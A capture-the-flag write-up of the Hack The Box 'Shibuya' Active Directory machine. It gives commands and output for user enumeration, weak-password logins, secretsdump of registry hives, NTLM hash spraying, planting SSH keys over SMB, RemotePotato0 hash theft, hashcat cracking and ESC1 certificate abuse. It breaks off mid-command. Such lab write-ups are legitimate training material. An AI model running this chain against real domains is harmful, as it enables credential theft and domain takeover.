---
title: Shibuya
summary: Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Hostname setup, Enuumeration, SMB (445).
date: 2026-03-31
tags: [Hack The Box, Active Directory, Windows]
difficulty: hard
os: Windows
url: https://app.hackthebox.com/machines/Shibuya
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Shibuya%20%5BHard%20-%20AD%5D/Shibuya%20%5BAD%5D%20%5BHard%5D.md
---

# Shibuya
## Hostname setup
```python
sudo nxc smb 10.129.234.42 --generate-hosts-file /etc/hosts      
[sudo] password for kali: 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```
This has created me an entry in `/etc/hosts`

## Enuumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.234.42
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 17:13 +0000
Nmap scan report for 10.129.234.42
Host is up (0.014s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
50168/tcp open  unknown
50182/tcp open  unknown
50200/tcp open  unknown
50888/tcp open  unknown
51970/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds
```
Whats interesting here is that there is SSH (22) open
### Nmap
```python
nmap -p 22,53,88,135,139,445,464,593,3268,3269,3389,9389 -A --min-rate=2000 -sT AWSJPDC0522.shibuya.vl
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 17:17 +0000
Nmap scan report for AWSJPDC0522.shibuya.vl (10.129.234.42)
Host is up (0.015s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-21 17:17:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-21T17:03:50
|_Not valid after:  2027-03-21T17:03:50
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-21T17:03:50
|_Not valid after:  2027-03-21T17:03:50
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-21T17:17:55+00:00
|_ssl-date: 2026-03-21T17:18:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-20T17:12:59
|_Not valid after:  2026-09-19T17:12:59
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Not a lot i can do with SSH until i get credentials

## SMB (445)
Null auth is enabled be default on domain controllers
Guest account is disabled

## Valid usernames found with kerbrute
```python
kerbrute userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/21/26 - Ronnie Flathers @ropnop

2026/03/21 17:30:01 >  Using KDC(s):
2026/03/21 17:30:01 >  	AWSJPDC0522.shibuya.vl:88

2026/03/21 17:30:01 >  [+] VALID USERNAME:	 purple@shibuya.vl
2026/03/21 17:30:02 >  [+] VALID USERNAME:	 red@shibuya.vl
2026/03/21 17:30:14 >  [+] VALID USERNAME:	 Purple@shibuya.vl
2026/03/21 17:30:22 >  [+] VALID USERNAME:	 Red@shibuya.vl
2026/03/21 17:30:38 >  [+] VALID USERNAME:	 RED@shibuya.vl
2026/03/21 17:30:38 >  [+] VALID USERNAME:	 PURPLE@shibuya.vl
```
Found two users `red` and `purple` neither are asrep roastable

I can try their username as their password

```python
nxc rdp AWSJPDC0522.shibuya.vl -u red -p 'red' -k 
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [+] shibuya.vl\red:red
```
I have successful as `red`

```python
nxc rdp AWSJPDC0522.shibuya.vl -u purple -p 'purple' -k
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [+] shibuya.vl\purple:purple
```
Also successful auth as `purple`

## SMB access as `red`
### Shares
```python
nxc smb AWSJPDC0522.shibuya.vl -u red$ -p 'red' -k --shares
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Enumerated shares
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Share           Permissions     Remark
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -----           -----------     ------
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      C$                              Default share
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      images$                         
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      users           READ 
```
### Users
```python
nxc smb AWSJPDC0522.shibuya.vl -u red$ -p 'red' -k --users-export users.txt
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gillian.Douglas               2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Kelly.Davies                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Conor.Fletcher                2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Karl.Brown                    2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Tracey.Wood                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Mohamed.Brooks                2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Wendy.Stevenson               2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gerald.Allen                  2025-02-16 10:23:34 0 
```
I dumped the users there were 503 in total so i have not included them all in the output

Found what looks like a password in the user description

```python
svc_autojoin:K5&A6Dw9d8jrKWhV
```
Ill test these creds

## Compromising `svc_autojoin`

```python
nxc smb AWSJPDC0522.shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV'  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV
```
Successful authentication

```python
nxc smb AWSJPDC0522.shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' --shares               
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      users           READ 
```
This user has access to the `images$` share

```
smbclient \\\\AWSJPDC0522.shibuya.vl\\images$ -U 'svc_autojoin'%'K5&A6Dw9d8jrKWhV'                            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 16 11:24:08 2025
  ..                                DHS        0  Wed Apr  9 01:09:45 2025
  AWSJPWK0222-01.wim                  A  8264070  Sun Feb 16 11:23:41 2025
  AWSJPWK0222-02.wim                  A 50660968  Sun Feb 16 11:23:45 2025
  AWSJPWK0222-03.wim                  A 32065850  Sun Feb 16 11:23:47 2025
  vss-meta.cab                        A   365686  Sun Feb 16 11:22:37 2025

		5048575 blocks of size 4096. 1565210 blocks available
smb: \> 
```
Found some .wim files which ill transfer to my machine

The second .wim file `AWSJPWK0222-02.wim` has SAM, SYTEM and SECURITY registry hives

```python
secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1
dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06
[*] NL$KM 
 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f
 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.
 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.
 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...
NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97
[*] Cleaning up...
```
Ive dumped the hashes of some users

The hash for the administrator does not work

The hash for the `operator` does not work

Ill put all these hashes into a file

## Spraying NTLM hashes
```python
nxc smb AWSJPDC0522.shibuya.vl -u users.txt -H 'hashes.txt' --continue-on-success

SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50
```
Found that the hash for the operator is the hash for `simon.watson`

```python
nxc smb AWSJPDC0522.shibuya.vl -u simon.watson -H '5d8c3d1a20bd63f60f469f6763ca0d50' --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\simon.watson:5d8c3d1a20bd63f60f469f6763ca0d50 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      users           READ 
```
Since i only have a hash i cant SSH yet

But i can connect to the `users` share and add my public key to authorized_keys then SSH in

```python
smbclient \\\\AWSJPDC0522.shibuya.vl\\users -U 'simon.watson' --pw-nt-hash '5d8c3d1a20bd63f60f469f6763ca0d50' 
Try "help" to get a list of possible commands.
smb: \> cd simon.watson
smb: \simon.watson\> mkdir .ssh
smb: \simon.watson\> cd .ssh
smb: \simon.watson\.ssh\> put /home/kali/.ssh/id_ed25519.pub authorized_keys
putting file /home/kali/.ssh/id_ed25519.pub as \simon.watson\.ssh\authorized_keys (1.9 kB/s) (average 1.2 kB/s)
```
Now i should be able to SSH in 

## SSH access as `simon.watson`
```python
ssh simon.watson@shibuya.vl -i /home/kali/.ssh/id_ed25519 
The authenticity of host 'shibuya.vl (10.129.234.42)' can't be established.
ED25519 key fingerprint is: SHA256:SiXhmjQMScl7eQgH4/uyVXXTsCHM6diy6fh80l4zzJQ
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:22: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'shibuya.vl' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>
```
I now have access via SSH

Ill upload sharphound

```python
scp -i /home/kali/.ssh/id_ed25519 SharpHound.exe simon.watson@shibuya.vl:/programdata/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
SharpHound.exe
```
This uploaded it to the target

```python
PS C:\Users\simon.watson\Desktop> C:\programdata\SharpHound.exe -c All
```
I have now got some data i can upload to bloodhound

```python
scp -i /home/kali/.ssh/id_ed25519 simon.watson@shibuya.vl:Desktop/20260321123636_BloodHound.zip .
```
This copied the results back to my machine

Now i can put them into bloodhound

## Bloodhound
The `AWSJPDC0522.SHIBUYA.VL` machine account has two active sessions, one for simon which is probably my session over SSH and the other is for a user `nigel.mills`

To exploit this ill upload RunasCs to get the target session ID 

## Compromising `nigel.mills`
```python
scp -i /home/kali/.ssh/id_ed25519 RunasCs.exe simon.watson@shibuya.vl:/programdata/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
RunasCs.exe                                                                       100%   51KB 949.2KB/s   00:00
```
This uploaded it

```python
PS C:\Users\simon.watson\Desktop> C:\programdata\RunasCs.exe user pass qwinsta -l 9 

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 rdp-tcp#0         nigel.mills               1  Active
 console                                     2  Conn
 rdp-tcp                                 65536  Listen
PS C:\Users\simon.watson\Desktop>
```
Found `nigels` session ID `1`

Next step is to upload RemotePotato0

```python
scp -i /home/kali/.ssh/id_ed25519 RemotePotato0.exe simon.watson@shibuya.vl:/programdata/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
RemotePotato0.exe                                                                 100%  173KB   1.3MB/s   00:00
```
This uploaded the remotepotato

```python
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8080
[sudo] password for kali: 
```
Started a socat listener

```python
PS C:\Users\simon.watson\Desktop> C:\programdata\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.90 -p 8080
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 8080
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8080
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 8080 ... 
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 8080
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:79335a02a3610233:c4023f4f08e613333affe042c375ac0f:0101000000000000945b690e6db9dc0171134e5e2ddb29b20000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800945b690e6db9dc0106000400060000000800300030000000000000000100000000200000c8bdde354ca45207e5b37c05c429a0770976a5c302a5443bc4777564440fe6040a00100000000000000000000000000000000000090000000000000000000000
```

### Cracking the hash
```python
hashcat nigelmills.hash /usr/share/wordlists/rockyou.txt

NIGEL.MILLS::SHIBUYA:79335a02a3610233:c4023f4f08e613333affe042c375ac0f:0101000000000000945b690e6db9dc0171134e5e2ddb29b20000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800945b690e6db9dc0106000400060000000800300030000000000000000100000000200000c8bdde354ca45207e5b37c05c429a0770976a5c302a5443bc4777564440fe6040a00100000000000000000000000000000000000090000000000000000000000:Sail2Boat3
```
I can now test these creds

```python
nxc smb AWSJPDC0522.shibuya.vl -u 'nigel.mills' -p 'Sail2Boat3'   
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\nigel.mills:Sail2Boat3
```
This user has now been compromised

## Domain admin via ESC1
```python
ssh nigel.mills@shibuya.vl -D 1080            
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nigel.mills@shibuya.vl's password: 

Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>
```
Ive logged into SSH as this user using a socks proxy

```python
socks5  127.0.0.1 1080
```
Ive added the port from the socks proxy to `/etc/proxychains.conf`

```python
proxychains certipy-ad find -u nigel.mills@shibuya.vl -p 'Sail2Boat3' -dc-ip 10.129.234.42 -vulnerable -stdout
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:636  ...  OK
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'shibuya-AWSJPDC0522-CA' via RRP
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:445  ...  OK
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'shibuya-AWSJPDC0522-CA'
[*] Checking web enrollment for CA 'shibuya-AWSJPDC0522-CA' @ 'AWSJPDC0522.shibuya.vl'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:80  ...  OK
[!] Error checking web enrollment: Server disconnected without sending a response.
[!] Use -debug to print a stacktrace
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:443  ...  OK
[!] Error checking web enrollment: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1033)
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : shibuya-AWSJPDC0522-CA
    DNS Name                            : AWSJPDC0522.shibuya.vl
    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl
    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52
    Certificate Validity Start          : 2025-02-15 07:24:14+00:00
    Certificate Validity End            : 2125-02-15 07:34:13+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHIBUYA.VL\Administrators
      Access Rights
        ManageCa                        : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        ManageCertificates              : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Enroll                          : SHIBUYA.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ShibuyaWeb
    Display Name                        : ShibuyaWeb
    Certificate Authorities             : shibuya-AWSJPDC0522-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Any Purpose
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 75 years
    Minimum RSA Key Length              : 4096
    Template Created                    : 2025-02-15T07:37:49+00:00
    Template Last Modified              : 2025-02-19T10:58:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHIBUYA.VL\t1_admins
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SHIBUYA.VL\_admin
        Full Control Principals         : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Owner Principals          : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Property Enroll           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
    [+] User Enrollable Principals      : SHIBUYA.VL\t1_admins
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC2                              : Template can be used for any purpose.
      ESC3                              : Template has Certificate Request Agent EKU set.
```
As seen here is is vulnerable to ESC1 and others as well but since ESC1 is the simplest ill chose that one

### ESC1
```python
proxychains certipy-ad account -u 'nigel.mills' -p 'Sail2Boat3' -dc-ip '10.129.234.42' -user '_admin' read       
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:636  ...  OK
[*] Reading attributes for '_admin':
    cn                                  : _admin
    distinguishedName                   : CN=_admin,CN=Users,DC=shibuya,DC=vl
    name                                : _admin
    objectSid                           : S-1-5-21-87560095-894484815-3652015022-500
    sAMAccountName                      : _admin
    userAccountControl                  : 66048
    whenCreated                         : 2025-02-15T07:24:21+00:00
    whenChanged                         : 2025-05-07T09:26:52+00:00
```
I first grabbed the admins SID

Now i will comment out the entry in `/etc/hosts` and add `AWSJPDC0522.shibuya.vl` to the `127.0.0.1` line so that it resolves to my localhost where the proxy is
```python
proxychains certipy-ad req -u 'nigel.mills' -p 'Sail2Boat3' -dc-ip '127.0.0.1' -target 'AWSJPDC0522.shibuya.vl' -ca 'shibuya-AWSJPDC0522-CA' -template 'ShibuyaWeb' -upn '_admin@shibuya.vl' -sid 'S-1-5-21-87560095-894484815-3652015022-500' -key-size 4096 -debug
